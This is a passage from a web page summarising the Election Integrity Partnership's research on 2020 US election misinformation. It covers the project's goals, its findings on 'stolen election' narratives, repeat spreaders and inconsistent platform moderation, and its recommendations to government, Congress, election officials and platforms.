Digital Forensic Research Lab (DFRLab)&nbsp;</p></li></ul><h2>What We Did</h2><p>The EIP’s primary goals were to: (1) identify mis- and disinformation before it went viral and during viral outbreaks, (2) share clear and accurate counter-messaging, and (3) document the specific misinformation actors, transmission pathways, narrative evolutions, and information infrastructures that enabled these narratives to propagate. To identify the scope of our work, we built a <a href="https://www.eipartnership.net/policy-analysis/platform-policies"><span>framework</span></a> to compare the policies of 15 social media platforms across four categories:&nbsp;</p><ul data-rte-list="default"><li><p><em>Procedural interference</em>: misinformation related to actual election procedures</p></li><li><p><em>Participation interference</em>: content that includes intimidation to personal safety or deterrence to participation in the election process</p></li><li><p><em>Fraud</em>: content that encourages people to misrepresent themselves to affect the electoral process or illegally cast or destroy ballots</p></li><li><p><em>Delegitimization of election results</em>: content aiming to delegitimize election results on the basis of false or misleading claims&nbsp;</p></li></ul><p>The EIP used an innovative internal research structure that leveraged the capabilities of the partner organizations through a tiered analysis model based on “tickets” collected internally and from our external stakeholders. Of the tickets we processed, 72% were related to delegitimization of the election.&nbsp;</p><h2>Key Takeaways</h2><h4>Misleading and false claims and narratives coalesced into the metanarrative of a “stolen election,” which later propelled the January 6 insurrection.&nbsp;</h4><ul data-rte-list="default"><li><p>Right-leaning “blue-check” influencers transformed one-off stories, sometimes based on honest voter concerns or genuine misunderstandings, into cohesive narratives of systemic election fraud.&nbsp;</p></li><li><p>Warped stories frequently centered on mail-in voting and accusations of found, discarded, or destroyed ballots, particularly in swing states. Misleading framing of real-world incidents often took the form of falsely assigning intent, exaggerating impact, falsely framing the date, or altering locale.&nbsp;</p></li><li><p>The metanarrative of a “stolen election” coalesced into the #StopTheSteal movement, encompassing many of the previous narratives. The narrative appeared across platforms and quickly inspired online organizing and offline protests, leading ultimately to the January 6 rally at the White House and the insurrection at the Capitol.&nbsp;</p></li><li><p>Fact-checking of narratives had mixed results; non-falsifiable narratives presented a particular challenge. In some cases, social media platform fact-checks risked drawing further attention to the claims they sought to debunk.&nbsp;</p></li></ul><h4>The production and spread of misinformation was multidirectional and participatory.&nbsp;</h4><ul data-rte-list="default"><li><p>Individuals participated in the creation and spread of narratives. Bottom-up false and misleading narratives started with individuals identifying real-world or one-off incidents and posting them to social media. Influencers and hyperpartisan media leveraged this grassroots content, assembling it into overarching narratives about fraud, and disseminating it across platforms to their large audiences. Mass media often picked up these stories after they had reached a critical mass of engagement.</p></li><li><p>Top-down mis- and disinformation moved in the opposite direction, with claims first made by prominent political operatives and influencers, often on mass media, which were then discussed and shared by people across social media properties.</p></li></ul><h4>Narrative spread was cross-platform: repeat spreaders leveraged the specific features of each platform for maximum amplification.&nbsp;</h4><ul data-rte-list="default"><li><p>The cross-platform nature of misinformation content and narrative spread limited the efficacy of any single platform’s response.</p></li><li><p>Smaller, niche, and hyperpartisan platforms, which were often less moderated or completely unmoderated, hosted and discussed content that had been moderated elsewhere. Parler in particular saw a remarkable increase in its active user base, as users rejected the “censorship” they perceived on other platforms.</p></li></ul><h4>The primary repeat spreaders of false and misleading narratives were verified, blue-check accounts belonging to partisan media outlets, social media influencers, and political figures, including President Trump and his family.</h4><ul data-rte-list="default"><li><p>These repeat spreaders amplified the majority of the investigated incidents aggressively across multiple platforms.&nbsp;</p></li><li><p>Repeat spreaders often promoted and spread each others’ content. Once content from misleading narratives entered this network, it spread quickly across the overlapping audiences.</p></li></ul><h4>Many platforms expanded their election-related policies during the 2020 election cycle. However, application of moderation policies was inconsistent or unclear.</h4><ul data-rte-list="default"><li><p>Platforms took action against policy violations by suspending users or removing content, downranking or preventing content sharing, and applying informational labels. However, moderation efforts were applied inconsistently on and across platforms, and policy language and updates were often unclear.</p></li><li><p>Account suspensions and content removal or labeling sometimes contributed to conspiratorial narratives that platforms were “covering up the truth,” entangling platforms with the narratives they wished to eliminate.</p></li><li><p>Lack of transparency and access to platform APIs hindered external research into the effectiveness of platform policies and interventions.&nbsp;</p></li></ul><h2>Key Recommendations</h2><h3>Federal Government</h3><ul data-rte-list="default"><li><p>Establish clear authorities and roles for identifying and countering election related mis- and disinformation. Build on the federal interagency movement toward recognizing elections as a national security priority and critical infrastructure.&nbsp;</p></li><li><p>Create clear standards for consistent disclosures of mis- and disinformation from foreign and domestic sources as a core function of facilitating free and fair elections, including via CISA’s Rumor Control and joint interagency statements.</p></li></ul><h3>Congress</h3><ul data-rte-list="default"><li><p>Pass existing bipartisan proposals for increased appropriations marked for federal and state election security.</p></li><li><p>Codify the Senate Select Committee on Intelligence’s bipartisan recommendations related to the depoliticization of election security and the behavior of public officials and candidates for federal office noted in Volumes <a href="https://www.intelligence.senate.gov/sites/default/files/documents/Report_Volume3.pdf"><span>3</span></a> and <a href="https://www.intelligence.senate.gov/sites/default/files/documents/report_volume5.pdf"><span>5</span></a> of the Committee’s report on foreign influence in 2016 elections.</p></li></ul><h3>State and Local Officials</h3><ul data-rte-list="default"><li><p>Establish trusted channels of communication with voters. This should include a .gov website and use of both traditional and social media.&nbsp;</p></li><li><p>Ensure that all votes cast are on auditable paper records and that efficient, effective, and transparent post-election audits are conducted after each election.</p></li></ul><h3>Platforms</h3><ul data-rte-list="default"><li><p>Provide proactive information regarding anticipated election misinformation. For example, if researchers expect a narrative will emerge, platforms should explain that narrative’s history or provide fact-checks or context related to its prior iterations.</p></li><li><p>Invest in research into the efficacy of internal policy interventions (such as labeling) and share those results with external researchers, civil society, and the public.&nbsp;</p></li><li><p>Increase the amount and granularity of data regarding interventions, takedowns, and labeling to allow for independent analysis of the efficacy of these policies.</p></li><li><p>Impose clear consequences for accounts that repeatedly violate platform policies. These accounts could be placed on explicit probationary status, facing a mixture of monitoring and sanctions.</p></li><li><p>Prioritize election officials’ efforts to educate voters within their jurisdiction and respond to misinformation. This could include the promotion of …</p></li></ul></div></div></div></div>
